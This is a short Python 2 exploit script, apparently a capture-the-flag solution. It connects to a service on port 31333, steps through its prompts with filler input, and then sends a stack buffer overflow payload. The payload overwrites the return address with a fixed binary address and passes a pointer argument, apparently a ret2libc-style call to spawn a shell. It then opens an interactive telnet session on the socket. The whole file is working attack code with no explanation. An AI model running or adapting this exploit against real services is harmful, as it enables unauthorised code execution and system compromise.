import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib
import time,random
import sys
import re

LOCAL = ('localhost',31333)
# LOCAL = (sys.argv[1],31335)
# LOCAL = ('128.199.133.96',31331)
BUFFER = 4096

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)

def recv_until(str,debug=1):
    recv_ = ''
    while not str in recv_:
        tmp = s.recv(BUFFER)
        recv_ += tmp
        if debug:
            print tmp
        continue
    return recv_

junk = "A"*126+"\n"
raw_input('?')
recv_until('year?')
s.send('yes\n')
recv_until(':')
s.send(junk)
recv_until(':')
s.send(junk)
recv_until(':')
s.send(junk)
recv_until(':')
s.send(junk)
recv_until('Anything')
payload = 'A'*24
payload += pack('<I',0x8048450)
payload += pack('<II',0x41414141,0x8048d20+34)

s.send(payload+"\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()



s.close()



